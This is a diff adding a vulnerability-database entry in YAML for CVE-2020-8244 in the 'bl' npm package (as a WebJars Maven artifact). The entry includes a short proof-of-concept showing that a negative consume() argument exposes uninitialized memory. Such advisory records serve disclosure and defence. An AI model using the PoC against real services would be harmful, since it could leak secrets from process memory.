@@ -45,3 +45,46 @@
   - https://github.com/rvagg/bl/pull/22
   - https://snyk.io/blog/exploiting-buffer/
   source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-479474
+- id: snykio:maven:org.webjars.npm:bl:608892
+  title: Remote Memory Exposure
+  description: |+
+    Affected versions of this package are vulnerable to Remote Memory
+    Exposure. If user input ends up in `consume()` argument and can become
+    negative, BufferList state can be corrupted, tricking it into exposing
+    uninitialized memory via regular `.slice()` calls.
+
+    ### PoC by chalker   {#poc-by-chalker}
+
+        const { BufferList } = require('bl')
+        const secret = require('crypto').randomBytes(256)
+        for (let i = 0; i < 1e6; i++) {
+          const clone = Buffer.from(secret)
+          const bl = new BufferList()
+          bl.append(Buffer.from('a'))
+          bl.consume(-1024)
+          const buf = bl.slice(1)
+          if (buf.indexOf(clone) !== -1) {
+            console.error(`Match (at ${i})`, buf)
+          }
+        }
+
+  affected_package: org.webjars.npm:bl
+  vulnerable_versions:
+  - ">= 0"
+  severity: high
+  package_manager: maven
+  cve:
+  - CVE-2020-8244
+  cwe:
+  - CWE-9
+  disclosed_date: 2020-08-27
+  created_date: 2020-08-28
+  last_modified_date: 2020-08-28
+  credit:
+  - chalker
+  references:
+  - https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e
+  - https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190
+  - https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466
+  - https://hackerone.com/reports/966347
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-608892
